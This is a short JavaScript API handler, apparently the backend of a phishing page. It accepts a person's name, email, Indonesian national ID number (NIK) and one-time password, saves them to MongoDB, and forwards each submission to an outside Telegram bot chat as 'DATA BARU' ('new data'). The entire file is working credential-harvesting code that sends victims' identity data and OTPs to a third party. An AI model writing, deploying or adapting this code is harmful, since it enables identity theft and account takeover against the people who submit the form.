import axios from "axios";
import mongoose from "mongoose";

const MONGO_URI = process.env.MONGO_URI;

if (!mongoose.connections[0].readyState) {
  await mongoose.connect(MONGO_URI);
}

const DataSchema = new mongoose.Schema({
  nama: String,
  email: String,
  nik: String,
  otp: String,
  createdAt: { type: Date, default: Date.now }
});

const Data = mongoose.models.Data || mongoose.model("Data", DataSchema);

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { nama, email, nik, otp } = req.body;

  try {
    await Data.create({ nama, email, nik, otp });

    await axios.post(`https://api.telegram.org/bot${process.env.TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: `📥 DATA BARU\nNama: ${nama}\nEmail: ${email}\nNIK: ${nik}\nOTP: ${otp}`
    });

    res.status(200).json({ message: "Berhasil dikirim ✅" });
  } catch (err) {
    res.status(500).json({ message: "Gagal ❌" });
  }
}